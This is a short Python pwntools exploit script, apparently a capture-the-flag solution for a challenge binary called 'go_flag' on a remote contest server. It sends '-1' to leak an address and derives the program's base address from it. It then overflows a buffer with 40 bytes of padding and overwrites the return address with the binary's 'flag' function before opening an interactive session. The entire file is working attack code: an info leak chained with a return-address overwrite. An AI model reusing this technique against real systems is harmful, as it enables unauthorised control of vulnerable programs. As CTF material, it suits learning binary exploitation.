from pwn import *

exe = ELF('./go_flag')
io = remote('apb2021.cstec.kr', 4242)
#gdb.attach(io, api=True)

io.recvuntil(b': ')
io.sendline(b'-1')
exe.address = int(io.recvline(keepends=False).decode(), 16) - exe.sym['go']
log.info('Base address: {}'.format(hex(exe.address)))
payload = b'i'*40 + p64(exe.sym['flag'])
io.sendline(payload)
io.interactive()